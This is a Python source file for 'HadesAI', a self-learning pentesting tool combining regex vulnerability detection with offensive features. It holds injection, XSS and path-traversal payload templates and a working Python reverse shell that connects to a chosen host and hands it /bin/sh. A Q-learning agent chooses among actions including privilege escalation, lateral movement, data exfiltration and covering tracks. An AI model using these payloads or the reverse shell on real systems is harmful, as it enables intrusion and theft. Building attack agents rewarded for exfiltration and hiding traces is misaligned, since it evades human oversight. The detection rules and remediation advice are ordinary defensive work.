"""
HadesAI - Self-Learning Pentesting & Code Analysis AI
A reinforcement-learning based AI that improves through experience.
"""

import os
import json
import hashlib
import pickle
import sqlite3
import numpy as np
from datetime import datetime
from collections import defaultdict
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field
from pathlib import Path
import re
import ast
import threading
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("HadesAI")


@dataclass
class Experience:
    """Single learning experience for the AI"""
    id: str
    input_data: str
    action_taken: str
    result: str
    reward: float  # -1.0 to 1.0
    timestamp: datetime
    category: str  # 'exploit', 'code_analysis', 'vuln_detection', etc.
    metadata: Dict = field(default_factory=dict)


@dataclass
class SecurityPattern:
    """Learned security pattern"""
    pattern_id: str
    pattern_type: str  # 'vulnerability', 'exploit', 'defense', 'technique'
    signature: str
    confidence: float
    occurrences: int
    examples: List[str]
    countermeasures: List[str]
    cwe_ids: List[str]  # Common Weakness Enumeration
    cvss_score: Optional[float] = None


class KnowledgeBase:
    """Persistent knowledge base that grows with experience"""
    
    def __init__(self, db_path: str = "hades_knowledge.db"):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.lock = threading.Lock()
        self._init_db()
        
    def _init_db(self):
        cursor = self.conn.cursor()
        
        # Experiences table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS experiences (
                id TEXT PRIMARY KEY,
                input_data TEXT,
                action_taken TEXT,
                result TEXT,
                reward REAL,
                timestamp TEXT,
                category TEXT,
                metadata TEXT
            )
        ''')
        
        # Security patterns table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS security_patterns (
                pattern_id TEXT PRIMARY KEY,
                pattern_type TEXT,
                signature TEXT,
                confidence REAL,
                occurrences INTEGER,
                examples TEXT,
                countermeasures TEXT,
                cwe_ids TEXT,
                cvss_score REAL
            )
        ''')
        
        # Q-values for reinforcement learning
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS q_values (
                state_hash TEXT,
                action TEXT,
                q_value REAL,
                update_count INTEGER,
                PRIMARY KEY (state_hash, action)
            )
        ''')
        
        # Code patterns learned
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS code_patterns (
                pattern_hash TEXT PRIMARY KEY,
                language TEXT,
                pattern_type TEXT,
                code_template TEXT,
                description TEXT,
                success_rate REAL,
                usage_count INTEGER
            )
        ''')
        
        self.conn.commit()
        
    def store_experience(self, exp: Experience):
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO experiences 
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                exp.id, exp.input_data, exp.action_taken, exp.result,
                exp.reward, exp.timestamp.isoformat(), exp.category,
                json.dumps(exp.metadata)
            ))
            self.conn.commit()
            
    def get_similar_experiences(self, input_data: str, category: str, limit: int = 10) -> List[Experience]:
        """Find similar past experiences for decision making"""
        cursor = self.conn.cursor()
        cursor.execute('''
            SELECT * FROM experiences 
            WHERE category = ? 
            ORDER BY reward DESC, timestamp DESC 
            LIMIT ?
        ''', (category, limit))
        
        experiences = []
        for row in cursor.fetchall():
            experiences.append(Experience(
                id=row[0], input_data=row[1], action_taken=row[2],
                result=row[3], reward=row[4], 
                timestamp=datetime.fromisoformat(row[5]),
                category=row[6], metadata=json.loads(row[7])
            ))
        return experiences

    def update_q_value(self, state_hash: str, action: str, q_value: float):
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute('''
                INSERT INTO q_values (state_hash, action, q_value, update_count)
                VALUES (?, ?, ?, 1)
                ON CONFLICT(state_hash, action) DO UPDATE SET
                    q_value = ?,
                    update_count = update_count + 1
            ''', (state_hash, action, q_value, q_value))
            self.conn.commit()
            
    def get_q_value(self, state_hash: str, action: str) -> float:
        cursor = self.conn.cursor()
        cursor.execute(
            'SELECT q_value FROM q_values WHERE state_hash = ? AND action = ?',
            (state_hash, action)
        )
        result = cursor.fetchone()
        return result[0] if result else 0.0
    
    def store_pattern(self, pattern: SecurityPattern):
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO security_patterns
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                pattern.pattern_id, pattern.pattern_type, pattern.signature,
                pattern.confidence, pattern.occurrences,
                json.dumps(pattern.examples), json.dumps(pattern.countermeasures),
                json.dumps(pattern.cwe_ids), pattern.cvss_score
            ))
            self.conn.commit()


class VulnerabilityDetector:
    """Detects vulnerabilities in code using learned patterns"""
    
    VULN_PATTERNS = {
        'sql_injection': [
            r'execute\s*\(\s*["\'].*%s.*["\']\s*%',
            r'cursor\.execute\s*\([^,]+\+',
            r'f["\'].*SELECT.*\{.*\}',
            r'\.format\(.*\).*(?:SELECT|INSERT|UPDATE|DELETE)',
        ],
        'xss': [
            r'innerHTML\s*=',
            r'document\.write\s*\(',
            r'\.html\s*\([^)]*\+',
            r'dangerouslySetInnerHTML',
        ],
        'command_injection': [
            r'os\.system\s*\([^)]*\+',
            r'subprocess\.\w+\s*\([^)]*shell\s*=\s*True',
            r'eval\s*\(',
            r'exec\s*\(',
        ],
        'path_traversal': [
            r'open\s*\([^)]*\+',
            r'\.\./',
            r'os\.path\.join\s*\([^)]*request',
        ],
        'hardcoded_secrets': [
            r'password\s*=\s*["\'][^"\']+["\']',
            r'api_key\s*=\s*["\'][^"\']+["\']',
            r'secret\s*=\s*["\'][^"\']+["\']',
            r'token\s*=\s*["\'][A-Za-z0-9+/=]{20,}["\']',
        ],
        'insecure_deserialization': [
            r'pickle\.loads?\s*\(',
            r'yaml\.load\s*\([^)]*Loader\s*=\s*None',
            r'marshal\.loads?\s*\(',
        ],
        'buffer_overflow': [
            r'strcpy\s*\(',
            r'sprintf\s*\(',
            r'gets\s*\(',
            r'memcpy\s*\([^)]*sizeof',
        ],
    }
    
    def __init__(self, knowledge_base: KnowledgeBase):
        self.kb = knowledge_base
        self.learned_patterns: Dict[str, List[str]] = defaultdict(list)
        self._load_learned_patterns()
        
    def _load_learned_patterns(self):
        """Load patterns learned from experience"""
        cursor = self.kb.conn.cursor()
        cursor.execute('SELECT pattern_type, signature FROM security_patterns WHERE confidence > 0.7')
        for row in cursor.fetchall():
            self.learned_patterns[row[0]].append(row[1])
            
    def analyze_code(self, code: str, language: str = "python") -> List[Dict[str, Any]]:
        """Analyze code for vulnerabilities"""
        findings = []
        
        # Check built-in patterns
        for vuln_type, patterns in self.VULN_PATTERNS.items():
            for pattern in patterns:
                matches = re.finditer(pattern, code, re.IGNORECASE | re.MULTILINE)
                for match in matches:
                    line_num = code[:match.start()].count('\n') + 1
                    findings.append({
                        'type': vuln_type,
                        'severity': self._get_severity(vuln_type),
                        'line': line_num,
                        'match': match.group(),
                        'pattern': pattern,
                        'source': 'builtin'
                    })
        
        # Check learned patterns
        for vuln_type, patterns in self.learned_patterns.items():
            for pattern in patterns:
                try:
                    matches = re.finditer(pattern, code, re.IGNORECASE | re.MULTILINE)
                    for match in matches:
                        line_num = code[:match.start()].count('\n') + 1
                        findings.append({
                            'type': vuln_type,
                            'severity': self._get_severity(vuln_type),
                            'line': line_num,
                            'match': match.group(),
                            'pattern': pattern,
                            'source': 'learned'
                        })
                except re.error:
                    continue
                    
        return findings
    
    def _get_severity(self, vuln_type: str) -> str:
        severity_map = {
            'sql_injection': 'CRITICAL',
            'command_injection': 'CRITICAL',
            'insecure_deserialization': 'CRITICAL',
            'buffer_overflow': 'CRITICAL',
            'xss': 'HIGH',
            'path_traversal': 'HIGH',
            'hardcoded_secrets': 'HIGH',
        }
        return severity_map.get(vuln_type, 'MEDIUM')
    
    def learn_pattern(self, vuln_type: str, pattern: str, confidence: float = 0.5):
        """Learn a new vulnerability pattern from experience"""
        pattern_id = hashlib.sha256(f"{vuln_type}:{pattern}".encode()).hexdigest()[:16]
        
        sec_pattern = SecurityPattern(
            pattern_id=pattern_id,
            pattern_type=vuln_type,
            signature=pattern,
            confidence=confidence,
            occurrences=1,
            examples=[],
            countermeasures=[],
            cwe_ids=[]
        )
        
        self.kb.store_pattern(sec_pattern)
        self.learned_patterns[vuln_type].append(pattern)
        logger.info(f"Learned new pattern for {vuln_type}: {pattern}")


class ExploitGenerator:
    """Generates exploit code based on learned patterns"""
    
    EXPLOIT_TEMPLATES = {
        'sql_injection': {
            'union_based': "' UNION SELECT {columns} FROM {table}--",
            'boolean_blind': "' AND 1=1--",
            'time_based': "' AND SLEEP({seconds})--",
            'error_based': "' AND EXTRACTVALUE(1,CONCAT(0x7e,({query})))--",
        },
        'xss': {
            'reflected': '<script>alert("{payload}")</script>',
            'stored': '<img src=x onerror="alert(\'{payload}\')">',
            'dom_based': 'javascript:alert("{payload}")',
        },
        'command_injection': {
            'basic': '; {command}',
            'pipe': '| {command}',
            'backtick': '`{command}`',
            'newline': '\n{command}',
        },
        'path_traversal': {
            'basic': '../../../{target}',
            'encoded': '..%2f..%2f..%2f{target}',
            'null_byte': '../../../{target}%00',
        }
    }
    
    def __init__(self, knowledge_base: KnowledgeBase):
        self.kb = knowledge_base
        self.success_rates: Dict[str, Dict[str, float]] = defaultdict(lambda: defaultdict(float))
        
    def generate_exploit(self, vuln_type: str, context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate exploit payloads for a vulnerability type"""
        exploits = []
        
        if vuln_type not in self.EXPLOIT_TEMPLATES:
            return exploits
            
        templates = self.EXPLOIT_TEMPLATES[vuln_type]
        
        for technique, template in templates.items():
            try:
                payload = template.format(**context)
                exploits.append({
                    'technique': technique,
                    'payload': payload,
                    'success_rate': self.success_rates[vuln_type][technique],
                    'notes': f"Auto-generated {technique} exploit for {vuln_type}"
                })
            except KeyError:
                # Missing context variables, use template as-is
                exploits.append({
                    'technique': technique,
                    'payload': template,
                    'success_rate': self.success_rates[vuln_type][technique],
                    'notes': f"Template for {technique} - fill in placeholders"
                })
                
        return sorted(exploits, key=lambda x: x['success_rate'], reverse=True)
    
    def record_exploit_result(self, vuln_type: str, technique: str, success: bool):
        """Learn from exploit attempt results"""
        current_rate = self.success_rates[vuln_type][technique]
        # Exponential moving average
        alpha = 0.1
        new_rate = alpha * (1.0 if success else 0.0) + (1 - alpha) * current_rate
        self.success_rates[vuln_type][technique] = new_rate
        logger.info(f"Updated success rate for {vuln_type}/{technique}: {new_rate:.2%}")


class ReinforcementLearner:
    """Q-Learning based decision making for the AI"""
    
    def __init__(self, knowledge_base: KnowledgeBase, 
                 learning_rate: float = 0.1,
                 discount_factor: float = 0.95,
                 exploration_rate: float = 0.2):
        self.kb = knowledge_base
        self.lr = learning_rate
        self.gamma = discount_factor
        self.epsilon = exploration_rate
        self.actions = [
            'scan_vulnerabilities',
            'generate_exploit',
            'analyze_code',
            'fuzz_input',
            'enumerate_services',
            'privilege_escalation',
            'lateral_movement',
            'data_exfiltration',
            'cover_tracks'
        ]
        
    def _state_to_hash(self, state: Dict[str, Any]) -> str:
        """Convert state dict to hash for Q-table lookup"""
        state_str = json.dumps(state, sort_keys=True)
        return hashlib.sha256(state_str.encode()).hexdigest()[:16]
    
    def choose_action(self, state: Dict[str, Any]) -> str:
        """Epsilon-greedy action selection"""
        if np.random.random() < self.epsilon:
            # Explore: random action
            return np.random.choice(self.actions)
        else:
            # Exploit: best known action
            state_hash = self._state_to_hash(state)
            q_values = {a: self.kb.get_q_value(state_hash, a) for a in self.actions}
            return max(q_values, key=q_values.get)
    
    def learn(self, state: Dict, action: str, reward: float, next_state: Dict):
        """Update Q-value based on experience"""
        state_hash = self._state_to_hash(state)
        next_state_hash = self._state_to_hash(next_state)
        
        current_q = self.kb.get_q_value(state_hash, action)
        
        # Get max Q-value for next state
        next_q_values = [self.kb.get_q_value(next_state_hash, a) for a in self.actions]
        max_next_q = max(next_q_values) if next_q_values else 0.0
        
        # Q-learning update
        new_q = current_q + self.lr * (reward + self.gamma * max_next_q - current_q)
        
        self.kb.update_q_value(state_hash, action, new_q)
        logger.debug(f"Q-value update: ({state_hash}, {action}) = {new_q:.4f}")
        
    def decay_exploration(self, min_epsilon: float = 0.05, decay_rate: float = 0.995):
        """Reduce exploration rate over time"""
        self.epsilon = max(min_epsilon, self.epsilon * decay_rate)


class CodeGenerator:
    """Generates security-focused code"""
    
    PENTEST_TEMPLATES = {
        'port_scanner': '''
import socket
import concurrent.futures

def scan_port(host: str, port: int, timeout: float = 1.0) -> bool:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            return s.connect_ex((host, port)) == 0
    except:
        return False

def scan_ports(host: str, ports: range, max_workers: int = 100):
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(scan_port, host, p): p for p in ports}
        for future in concurrent.futures.as_completed(futures):
            port = futures[future]
            if future.result():
                open_ports.append(port)
    return sorted(open_ports)
''',
        'directory_bruteforce': '''
import requests
from concurrent.futures import ThreadPoolExecutor

def check_path(base_url: str, path: str) -> dict:
    url = f"{base_url.rstrip('/')}/{path}"
    try:
        r = requests.get(url, timeout=5, allow_redirects=False)
        return {'path': path, 'status': r.status_code, 'size': len(r.content)}
    except:
        return None

def bruteforce_dirs(base_url: str, wordlist: list, threads: int = 10):
    results = []
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(check_path, base_url, w) for w in wordlist]
        for f in futures:
            result = f.result()
            if result and result['status'] not in [404]:
                results.append(result)
    return results
''',
        'hash_cracker': '''
import hashlib
import itertools
import string

def crack_hash(target_hash: str, hash_type: str = 'md5', 
               charset: str = string.ascii_lowercase, max_len: int = 6):
    hash_func = getattr(hashlib, hash_type)
    for length in range(1, max_len + 1):
        for combo in itertools.product(charset, repeat=length):
            candidate = ''.join(combo)
            if hash_func(candidate.encode()).hexdigest() == target_hash:
                return candidate
    return None
''',
        'reverse_shell': '''
import socket
import subprocess
import os

def reverse_shell(host: str, port: int):
    """Educational purpose only - for authorized testing"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])
'''
    }
    
    def __init__(self, knowledge_base: KnowledgeBase):
        self.kb = knowledge_base
        
    def generate_tool(self, tool_type: str) -> str:
        """Generate a pentesting tool"""
        if tool_type in self.PENTEST_TEMPLATES:
            return self.PENTEST_TEMPLATES[tool_type]
        return f"# No template found for: {tool_type}"
    
    def list_available_tools(self) -> List[str]:
        return list(self.PENTEST_TEMPLATES.keys())


class HadesAI:
    """
    Main AI class - Self-learning pentesting and code analysis AI
    """
    
    def __init__(self, knowledge_path: str = "hades_knowledge.db"):
        self.kb = KnowledgeBase(knowledge_path)
        self.vuln_detector = VulnerabilityDetector(self.kb)
        self.exploit_gen = ExploitGenerator(self.kb)
        self.learner = ReinforcementLearner(self.kb)
        self.code_gen = CodeGenerator(self.kb)
        
        self.session_experiences: List[Experience] = []
        self.current_state: Dict[str, Any] = {}
        
        logger.info("HadesAI initialized")
        self._load_stats()
        
    def _load_stats(self):
        """Load statistics from knowledge base"""
        cursor = self.kb.conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM experiences')
        exp_count = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM security_patterns')
        pattern_count = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM q_values')
        q_count = cursor.fetchone()[0]
        
        logger.info(f"Loaded: {exp_count} experiences, {pattern_count} patterns, {q_count} Q-values")
        
    def analyze(self, code: str, language: str = "python") -> Dict[str, Any]:
        """Analyze code for vulnerabilities"""
        findings = self.vuln_detector.analyze_code(code, language)
        
        result = {
            'vulnerabilities': findings,
            'risk_level': self._calculate_risk_level(findings),
            'recommendations': self._generate_recommendations(findings),
            'exploit_suggestions': []
        }
        
        # Generate exploit suggestions for found vulnerabilities
        for finding in findings:
            vuln_type = finding['type']
            exploits = self.exploit_gen.generate_exploit(vuln_type, {})
            result['exploit_suggestions'].extend(exploits[:2])  # Top 2 per vuln
            
        return result
    
    def _calculate_risk_level(self, findings: List[Dict]) -> str:
        if not findings:
            return 'LOW'
        severities = [f['severity'] for f in findings]
        if 'CRITICAL' in severities:
            return 'CRITICAL'
        elif 'HIGH' in severities:
            return 'HIGH'
        elif 'MEDIUM' in severities:
            return 'MEDIUM'
        return 'LOW'
    
    def _generate_recommendations(self, findings: List[Dict]) -> List[str]:
        recs = []
        seen_types = set()
        
        for finding in findings:
            vuln_type = finding['type']
            if vuln_type in seen_types:
                continue
            seen_types.add(vuln_type)
            
            rec_map = {
                'sql_injection': 'Use parameterized queries or prepared statements',
                'xss': 'Sanitize and escape all user input before rendering',
                'command_injection': 'Avoid shell=True, use subprocess with list args',
                'path_traversal': 'Validate and sanitize file paths, use allowlists',
                'hardcoded_secrets': 'Use environment variables or secret management',
                'insecure_deserialization': 'Use safe serialization formats like JSON',
                'buffer_overflow': 'Use safe string functions (strncpy, snprintf)',
            }
            
            if vuln_type in rec_map:
                recs.append(f"[{vuln_type.upper()}] {rec_map[vuln_type]}")
                
        return recs
    
    def generate_tool(self, tool_type: str) -> str:
        """Generate a pentesting tool"""
        return self.code_gen.generate_tool(tool_type)
    
    def get_available_tools(self) -> List[str]:
        """List available tool templates"""
        return self.code_gen.list_available_tools()
    
    def decide_action(self, context: Dict[str, Any]) -> str:
        """Use RL to decide next action"""
        return self.learner.choose_action(context)
    
    def provide_feedback(self, action: str, success: bool, details: str = ""):
        """Learn from feedback on an action"""
        reward = 1.0 if success else -0.5
        
        exp = Experience(
            id=hashlib.sha256(f"{datetime.now().isoformat()}:{action}".encode()).hexdigest()[:16],
            input_data=json.dumps(self.current_state),
            action_taken=action,
            result=details,
            reward=reward,
            timestamp=datetime.now(),
            category=action,
            metadata={'success': success}
        )
        
        self.kb.store_experience(exp)
        self.session_experiences.append(exp)
        
        # Update Q-values
        new_state = {**self.current_state, 'last_action': action, 'last_success': success}
        self.learner.learn(self.current_state, action, reward, new_state)
        self.current_state = new_state
        
        # Decay exploration over time
        self.learner.decay_exploration()
        
        logger.info(f"Learned from feedback: {action} -> {'success' if success else 'failure'}")
        
    def learn_vulnerability_pattern(self, vuln_type: str, pattern: str):
        """Learn a new vulnerability pattern"""
        self.vuln_detector.learn_pattern(vuln_type, pattern)
        
    def get_stats(self) -> Dict[str, Any]:
        """Get learning statistics"""
        cursor = self.kb.conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM experiences')
        total_exp = cursor.fetchone()[0]
        
        cursor.execute('SELECT AVG(reward) FROM experiences')
        avg_reward = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT category, COUNT(*) FROM experiences GROUP BY category')
        category_counts = dict(cursor.fetchall())
        
        cursor.execute('SELECT COUNT(*) FROM security_patterns')
        patterns_learned = cursor.fetchone()[0]
        
        return {
            'total_experiences': total_exp,
            'average_reward': avg_reward,
            'experiences_by_category': category_counts,
            'patterns_learned': patterns_learned,
            'exploration_rate': self.learner.epsilon,
            'session_experiences': len(self.session_experiences)
        }
    
    def interactive_session(self):
        """Start an interactive session"""
        print("\n" + "="*60)
        print("  HADES AI - Self-Learning Pentesting Assistant")
        print("="*60)
        print("\nCommands:")
        print("  analyze <code>  - Analyze code for vulnerabilities")
        print("  tool <name>     - Generate a pentesting tool")
        print("  tools           - List available tools")
        print("  stats           - Show learning statistics")
        print("  decide          - Get AI recommended action")
        print("  feedback <action> <success/fail> - Provide feedback")
        print("  learn <type> <pattern> - Teach new vuln pattern")
        print("  help            - Show this help")
        print("  exit            - Exit session")
        print("="*60 + "\n")
        
        while True:
            try:
                cmd = input("hades> ").strip()
                if not cmd:
                    continue
                    
                parts = cmd.split(maxsplit=1)
                command = parts[0].lower()
                args = parts[1] if len(parts) > 1 else ""
                
                if command == 'exit':
                    print("Goodbye!")
                    break
                elif command == 'help':
                    self.interactive_session.__doc__
                elif command == 'stats':
                    stats = self.get_stats()
                    print(json.dumps(stats, indent=2))
                elif command == 'tools':
                    print("Available tools:", ", ".join(self.get_available_tools()))
                elif command == 'tool':
                    print(self.generate_tool(args))
                elif command == 'analyze':
                    result = self.analyze(args)
                    print(json.dumps(result, indent=2))
                elif command == 'decide':
                    action = self.decide_action(self.current_state)
                    print(f"Recommended action: {action}")
                elif command == 'feedback':
                    fb_parts = args.split()
                    if len(fb_parts) >= 2:
                        action = fb_parts[0]
                        success = fb_parts[1].lower() in ['success', 'true', '1', 'yes']
                        self.provide_feedback(action, success)
                        print("Feedback recorded")
                elif command == 'learn':
                    learn_parts = args.split(maxsplit=1)
                    if len(learn_parts) >= 2:
                        self.learn_vulnerability_pattern(learn_parts[0], learn_parts[1])
                        print("Pattern learned")
                else:
                    print(f"Unknown command: {command}")
                    
            except KeyboardInterrupt:
                print("\nGoodbye!")
                break
            except Exception as e:
                print(f"Error: {e}")


def main():
    """Main entry point"""
    ai = HadesAI()
    ai.interactive_session()


if __name__ == "__main__":
    main()
